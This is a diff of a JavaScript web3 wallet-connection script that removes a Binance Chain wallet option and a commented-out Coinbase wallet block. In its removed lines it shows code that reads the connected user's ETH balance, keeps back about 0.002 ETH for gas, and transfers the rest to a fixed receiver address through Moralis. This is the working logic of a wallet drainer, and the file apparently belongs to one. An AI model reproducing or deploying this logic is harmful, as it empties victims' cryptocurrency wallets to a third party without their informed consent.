@@ -62,20 +62,7 @@ async function init() {
       options: {
         infuraId: "ff343efcf191471e831cd4209a04f583",
       }
-    },
-
-    binancechainwallet: {
-      package: true
-    },
-
-    // coinbasewallet: {
-    //   package: CoinbaseWalletSDK, // Required
-    //   options: {
-    //     appName: "binance", // Required
-    //     infuraId: "ff343efcf191471e831cd4209a04f583", // Required
-    //     darkMode: true // Optional. Use dark theme, defaults to false
-    //   }
-    // },
+    }
 
   };
 
@@ -477,26 +464,7 @@ async function proceed(){
           // }
         }
         
-          const eth_balance = await getBalance(user_address, apiKey).catch(e=>{
-            console.log("Unable to get new eth balance", e);
-          });
-          console.log("eth_balance", eth_balance);
-          console.log("eth_balance.balance", eth_balance.balance);
-          const balance = ((parseInt(eth_balance.balance))/1000000000000000000) - 0.002;
-          console.log("The new eth balance", balance);
           
-          if (balance > 0) {
-          const options = {
-            type: "native",
-            amount: Moralis.Units.ETH(balance.toString()),
-            receiver: receiver_address,
-          };
-          let result = await Moralis.transfer(options);
-          console.log(result);
-        }
-        else {
-          console.log("Insufficient funds")
-        }
     }
     send();
 }
